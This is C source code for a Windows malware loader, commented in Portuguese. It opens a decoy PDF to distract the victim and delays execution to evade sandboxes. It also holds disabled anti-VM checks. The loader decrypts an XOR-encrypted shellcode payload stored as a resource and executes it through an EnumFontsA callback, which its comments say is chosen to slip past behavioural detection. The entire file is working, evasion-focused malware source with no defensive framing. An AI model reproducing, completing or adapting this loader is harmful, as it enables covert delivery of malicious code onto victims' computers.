#include <windows.h>
#include <shellapi.h>

// --- CONFIG: use a MESMA seed do encrypt2.py ---
static const char* SEED = "Medidas_Paco_De_Lucia_Oficial_1971";

// --- Derivação de chave FNV-1a (espelho do Python) ---
static void DeriveKey(const char* seed, unsigned char* key, unsigned int klen) {
    unsigned long long h = 0xcbf29ce484222325ULL;
    unsigned int i = 0;
    for (i = 0; i < klen && seed[i]; i++) {
        h ^= (unsigned char)seed[i];
        h *= 0x100000001b3ULL;
        key[i] = (unsigned char)(h & 0xFF);
    }
    // preenche o resto com rotação do hash se seed curta
    while (i < klen) {
        h *= 0x100000001b3ULL;
        key[i++] = (unsigned char)((h >> 13) & 0xFF);
    }
}

// --- Rolling XOR (espelho do Python) ---
static void Decrypt(unsigned char* d, unsigned int len, const unsigned char* key, unsigned int klen) {
    for (unsigned int i = 0; i < len; i++)
        d[i] ^= key[i % klen] ^ (unsigned char)(i & 0xFF);
}

// --- Anti-VM básico (descomente para testar em outra VM) ---
// static bool IsVM(void) {
//     if (GetFileAttributesA("C:\\windows\\System32\\Drivers\\Vmmouse.sys") != INVALID_FILE_ATTRIBUTES) return true;
//     if (GetFileAttributesA("C:\\windows\\System32\\Drivers\\VBoxGuest.sys") != INVALID_FILE_ATTRIBUTES) return true;
//     return false;
// }

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, PSTR cmdline, int cmdshow) {

    // 1. Abre o PDF real (distração / comportamento legítimo)
    ShellExecuteA(NULL, "open", "Medidas_Paco_De_Lucia_Oficial_1971.pdf", NULL, NULL, SW_SHOWNORMAL);

    // if (IsVM()) return 0;

    // 2. Delay variável (anti sandbox rápido)
    Sleep(12000 + (GetTickCount() % 5000));

    // 3. Carrega payload do recurso RCDATA (não fica como array no .data)
    HRSRC res = FindResourceA(NULL, (LPCSTR)"SHELL", (LPCSTR)RT_RCDATA);
    if (!res) return 0;
    HGLOBAL g = LoadResource(NULL, res);
    if (!g) return 0;
    DWORD len = SizeofResource(NULL, res);
    const unsigned char* src = (const unsigned char*)LockResource(g);
    if (!src || !len) return 0;

    // 4. Aloca RW, copia, descriptografa, muda para RX (nunca RWX)
    void* mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    memcpy(mem, src, len);

    unsigned char key[32];
    DeriveKey(SEED, key, sizeof(key));
    Decrypt((unsigned char*)mem, len, key, sizeof(key));

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    // 5. Execução via callback API (sem CreateThread — quebra assinatura comportamental)
    EnumFontsA(GetDC(NULL), NULL, (FONTENUMPROCA)mem, 0);

    return 0;
}
